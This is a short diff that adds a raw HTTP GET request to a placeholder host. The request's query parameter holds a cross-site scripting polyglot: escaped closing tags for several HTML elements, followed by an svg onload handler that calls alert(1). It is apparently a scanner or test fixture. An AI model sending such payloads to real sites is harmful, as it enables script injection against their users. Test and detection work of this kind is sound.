@@ -1,0 +1,4 @@
+GET /a?page=javascript:/*--\u003E\u003C/title\u003E\u003C/style\u003E\u003C/textarea\u003E\u003C/script\u003E\u003C/xmp\u003E\u003Csvg%20onload%3Dalert(1)\u003E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
